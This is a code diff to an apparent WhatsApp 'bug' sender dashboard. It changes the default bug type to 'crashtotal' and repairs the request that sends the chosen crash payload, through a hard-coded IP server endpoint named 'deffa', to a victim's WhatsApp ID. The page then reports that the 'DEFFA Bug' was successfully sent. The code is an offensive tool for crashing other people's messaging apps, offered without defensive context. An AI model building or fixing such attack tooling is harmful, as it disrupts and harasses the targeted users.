@@ -288,7 +288,7 @@ function showDashboard(user) {
   document.getElementById("userLabel").innerText = user.username;
 }
 
-let selectedBug = "type";
+let selectedBug = "crashtotal";
 document.querySelectorAll(".bug-card").forEach(card => {
   card.addEventListener("click", () => {
     document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
@@ -315,7 +315,7 @@ async function sendBug() {
   resDiv.innerText = "";
 
 try {
-  const res = await fetch(`http://178.128.51.107:5002/deffa?chatId=${sendBug}$type=${selectedBug}`);
+  const res = await fetch(`http://178.128.51.107:5002/deffa?type=${selectedBug}&chatId=${target}@s.whatsapp.net`);
   const json = await res.json();
 
   showPopup(`DEFFA Bug successfully sent to <b>${input}</b>`);
@@ -329,4 +329,4 @@ try {
 }
 </script>
 </body>
-    </html>
+</html>
